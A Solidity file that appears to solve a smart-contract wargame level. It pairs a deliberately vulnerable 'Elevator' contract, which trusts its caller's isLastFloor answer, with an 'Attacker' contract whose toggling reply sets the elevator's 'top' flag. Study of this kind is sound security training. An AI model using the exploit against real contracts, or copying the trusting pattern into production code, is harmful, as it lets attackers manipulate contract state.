// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Attacker is Building {
    bool public toggle = true;

    function isLastFloor(uint) external override returns (bool) {
        toggle = !toggle;
        return toggle;
    }

    function attack(Elevator _victim) public {
        _victim.goTo(type(uint).max);
    }
}